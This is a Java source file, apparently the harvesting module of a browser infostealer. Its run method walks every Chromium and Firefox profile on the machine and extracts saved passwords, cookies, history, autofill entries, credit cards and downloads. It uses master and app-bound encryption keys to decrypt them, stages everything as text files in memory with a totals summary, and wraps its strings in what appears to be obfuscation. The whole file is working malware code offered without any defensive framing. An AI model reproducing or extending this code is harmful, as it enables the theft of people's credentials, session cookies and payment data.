package noface.browsers;

import noface.config.Log;
import noface.config.S;
import noface.api.Mem;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public final class Pull {

    public record BrowserStat(String name, int cookies, int passwords, int history, int fill, int cards, int downloads) {}

    public record Stats(int passwords, int cookies, String log, List<BrowserStat> items, List<Pass.Entry> entries, int profiles, int ok, int tried) {}

    public static Stats run() throws IOException {
        int totalPw = 0, totalCk = 0;
        int seen = 0, ok = 0, tried = 0;
        StringBuilder log = new StringBuilder();
        List<BrowserStat> browserStats = new ArrayList<>();
        List<Pass.Entry> allPw = new ArrayList<>();

        for (Paths.Def browser : Paths.all()) {
            if (!java.nio.file.Files.isDirectory(browser.userData())) continue;

            Log.out(S.e("[*] ") + browser.name());

            List<Profile> profiles;
            try {
                profiles = Probe.find(browser);
            } catch (Exception e) {
                log.append(browser.name()).append(S.e(": err ")).append(e.getMessage()).append('\n');
                continue;
            }

            int bPw = 0, bCk = 0, bH = 0, bF = 0, bC = 0, bD = 0;
            for (Profile profile : profiles) {
                seen++;
                if (browser.chromium() && profile.masterKey() == null && profile.abeKey() == null) continue;
                tried++;

                String base = browser.name() + S.e("/") + profile.name();

                try {
                    if (!browser.chromium()) {
                        List<Pass.Entry> pw = Firefox.passwords(profile);
                        List<Cookie.Entry> ck = Firefox.cookies(profile);
                        List<Hist.Entry> hi = Firefox.history(profile);
                        List<Fill.Entry> fi = Firefox.form(profile);
                        if (!pw.isEmpty()) {
                            Mem.put(base + S.e("/passwords.txt"), Pass.fmt(pw));
                            allPw.addAll(pw);
                        }
                        if (!ck.isEmpty()) Mem.put(base + S.e("/cookies.txt"), Cookie.netscape(ck));
                        if (!hi.isEmpty()) Mem.put(base + S.e("/history.txt"), Hist.fmt(hi));
                        if (!fi.isEmpty()) Mem.put(base + S.e("/autofill.txt"), Fill.fmt(fi));
                        bPw += pw.size();
                        bCk += ck.size();
                        bH += hi.size();
                        bF += fi.size();
                    } else {
                        List<Pass.Entry> pw = Pass.pull(profile);
                        List<Cookie.Entry> ck = Cookie.pull(profile);
                        List<Hist.Entry> hi = Hist.pull(profile);
                        List<Fill.Entry> fi = Fill.pull(profile);
                        List<Card.Entry> cc = Card.pull(profile);
                        List<Dl.Entry> dl = Dl.pull(profile);
                        if (!pw.isEmpty()) {
                            Mem.put(base + S.e("/passwords.txt"), Pass.fmt(pw));
                            allPw.addAll(pw);
                        }
                        if (!ck.isEmpty()) Mem.put(base + S.e("/cookies.txt"), Cookie.netscape(ck));
                        if (!hi.isEmpty()) Mem.put(base + S.e("/history.txt"), Hist.fmt(hi));
                        if (!fi.isEmpty()) Mem.put(base + S.e("/autofill.txt"), Fill.fmt(fi));
                        if (!cc.isEmpty()) Mem.put(base + S.e("/cards.txt"), Card.fmt(cc));
                        if (!dl.isEmpty()) Mem.put(base + S.e("/downloads.txt"), Dl.fmt(dl));
                        bPw += pw.size();
                        bCk += ck.size();
                        bH += hi.size();
                        bF += fi.size();
                        bC += cc.size();
                        bD += dl.size();
                    }
                    ok++;
                } catch (Exception e) {
                    log.append(browser.name()).append(S.e("/")).append(profile.name())
                            .append(S.e(": ")).append(e.getMessage()).append('\n');
                }
            }

            if (bPw + bCk + bH + bF + bC + bD > 0) {
                browserStats.add(new BrowserStat(browser.name(), bCk, bPw, bH, bF, bC, bD));
            }

            if (browser.chromium()) {
                log.append(browser.name()).append(S.e(": pw=")).append(bPw).append(S.e(" ck=")).append(bCk)
                        .append(S.e(" h=")).append(bH).append(S.e(" a=")).append(bF).append(S.e(" cc=")).append(bC)
                        .append(S.e(" d=")).append(bD);
                byte[] mk = Key.master(browser.localState());
                log.append(S.e(" master=")).append(mk != null ? S.e("ok") : S.e("null"));
                if (Key.hasAbe(browser.localState())) {
                    boolean abeOk = false;
                    for (Profile p : profiles) {
                        if (p.abeKey() != null) {
                            abeOk = true;
                            break;
                        }
                    }
                    if (abeOk) log.append(S.e(" abe=ok"));
                    else {
                        String why = noface.browsers.abe.Resolve.lastReason();
                        log.append(S.e(" abe=")).append(why == null || why.isEmpty() ? S.e("skip") : why);
                    }
                }
                log.append('\n');
            } else if (bPw + bCk + bH + bF > 0) {
                log.append(browser.name()).append(S.e(": pw=")).append(bPw).append(S.e(" ck=")).append(bCk)
                        .append(S.e(" h=")).append(bH).append(S.e(" a=")).append(bF).append('\n');
            }

            totalPw += bPw;
            totalCk += bCk;
        }

        Mem.put(S.e("summary.txt"), S.e("passwords=") + totalPw + S.e("\ncookies=") + totalCk + S.e("\n\n") + log);
        return new Stats(totalPw, totalCk, log.toString(), browserStats, allPw, seen, ok, tried);
    }

    private Pull() {}
}
